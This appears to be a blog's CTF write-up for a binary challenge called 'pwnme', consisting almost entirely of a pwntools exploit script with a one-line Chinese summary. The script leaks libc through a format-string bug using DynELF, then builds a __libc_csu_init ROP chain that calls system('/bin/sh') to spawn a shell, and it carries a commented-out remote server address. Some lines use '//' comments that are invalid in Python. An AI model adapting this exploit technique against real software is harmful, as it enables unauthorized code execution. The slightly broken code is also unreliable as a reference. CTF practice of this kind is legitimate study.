<h3 id="1-pwnme"><a href="#1-pwnme" class="headerlink" title="1.pwnme"></a>1.pwnme</h3><p>格式化字符串漏洞，rop，数据类型强制转换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">#p=remote(&apos;106.75.2.53&apos;, 10006)</span><br><span class="line">p= process(&apos;./pwnme&apos;)</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line"> p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line"> p.sendline(&apos;2&apos;)</span><br><span class="line"> p.recvuntil(&apos;please input new username(max lenth:20): \n&apos;)</span><br><span class="line"> p.sendline(&apos;aaaa&apos;)</span><br><span class="line"> p.recvuntil(&apos;please input new password(max lenth:20): \n&apos;)</span><br><span class="line"> payload1 = &apos;%12$s&apos; + &apos;BIRDGO!&apos; + p64(addr)</span><br><span class="line"> p.send(payload1)</span><br><span class="line"> p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line"> p.sendline(&apos;1&apos;)</span><br><span class="line"> content = p.recvuntil(&apos;BIRDGO!&apos;)</span><br><span class="line"> if len(content) == 12:</span><br><span class="line">   return &apos;\x00&apos;</span><br><span class="line"> else:</span><br><span class="line">   return content[5:-7]</span><br><span class="line">   </span><br><span class="line">#泄露system地址</span><br><span class="line">p.recvuntil(&apos;Input your username(max lenth:40): \n&apos;)</span><br><span class="line">p.sendline(&apos;A&apos;)</span><br><span class="line">p.recvuntil(&apos;Input your password(max lenth:40): \n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(&apos;./pwnme&apos;))</span><br><span class="line">system_addr=d.lookup(&apos;system&apos;,&apos;libc&apos;)</span><br><span class="line">log.info(&apos;system_addr:%#x&apos;%system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;please input new username(max lenth:20): \n&apos;)</span><br><span class="line">p.sendline(&apos;cccc&apos;)</span><br><span class="line">p.recvuntil(&apos;please input new password(max lenth:20): \n&apos;)</span><br><span class="line"></span><br><span class="line">pppppr=0x0000000000400ecb</span><br><span class="line">pop_rdi_ret=0x0000000000400ed3</span><br><span class="line">init_addr=0x400EB0</span><br><span class="line">binsh_addr=0x0000000000602000</span><br><span class="line">read_got=0x0000000000601FC8</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x28</span><br><span class="line">payload+=p64(pppppr)+p64(1)+p64(read_got)+p64(0x8)+p64(binsh_addr)+p64(0)  //__libc_csu_init()</span><br><span class="line">payload+=p64(init_addr)+p64(0)*7   //这里为啥是7？？？</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload=payload.ljust(0x101,&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
